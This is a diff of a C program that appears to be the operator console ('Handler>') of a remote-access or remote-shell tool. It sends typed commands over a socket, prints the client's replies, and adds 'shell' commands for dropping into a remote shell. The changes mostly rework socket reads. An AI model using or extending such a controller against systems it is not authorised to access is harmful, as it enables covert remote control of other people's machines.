@@ -95,10 +95,11 @@ int main(int argc, char *argv[])
 	char command[2048];
 
 	//this is the connection one just to confirm things worked on the client end
-	read(sock, buff, sizeof(buff));
-	printf("%s", buff);
+//	read(sock, buff, sizeof(buff));
+//	printf("%s", buff);
 
 	int shell = 0;
+	int dontRead = 0;
 
 	while(1)
 	{
@@ -109,35 +110,43 @@ int main(int argc, char *argv[])
 			buff[i] = 0;
 		}
 
+		int count = 0; //this will hold buffer ammound
+
+		while(!count && !dontRead) //keep checking count until return comes (DANGEROUS)
+			ioctl(sock, FIONREAD, &count); //this will find amount of data on socket
+
+		if(!dontRead)
+		{
+			read(sock, buff, count);
+			printf("%s",buff);
+		}
+		else
+			dontRead = 0;
+
 		//if we arent currently dropped into a shell, show this prompt
-//		if(!shell)
-		printf("Handler> ");
+		if(!shell)
+			printf("Handler> "); //print out the line lead
 
 		fgets(command, sizeof(command), stdin); //input the command
 
 		if(command[0] == '\n')	//if they just press enter
+		{
+			dontRead = 1;
 			continue;
+		}
 
 		//if they want help just run help command.
 		if(!strcmp(command, "help\n"))
 		{
 			help();
+			dontRead = 1;
 			continue;
 		}
 
 		write(sock, command, strlen(command));
 
-		int count = 0; //this will hold buffer ammound
-		ioctl(sock, FIONREAD, &count); //this will find amount of data on socket
 
-		if(count) //read from the buffer if there is anything to read
-		{
-			read(sock, buff, count);
-			printf("%s",buff);
-		}
-
-
-/*		if(!strcmp(command, "shell\n") || !strcmp(command, "shell2\n"))
+		if(!strcmp(command, "shell\n") || !strcmp(command, "shell2\n"))
 		{
 			shell++;
 			continue;
@@ -167,9 +176,8 @@ int main(int argc, char *argv[])
 
 
 		//read from the output that the client gives us and then print to screen
-		read(sock, buff, sizeof(buff));
-		puts(buff);
-*/
+//		read(sock, buff, sizeof(buff));
+//		puts(buff);
 
 	}
 
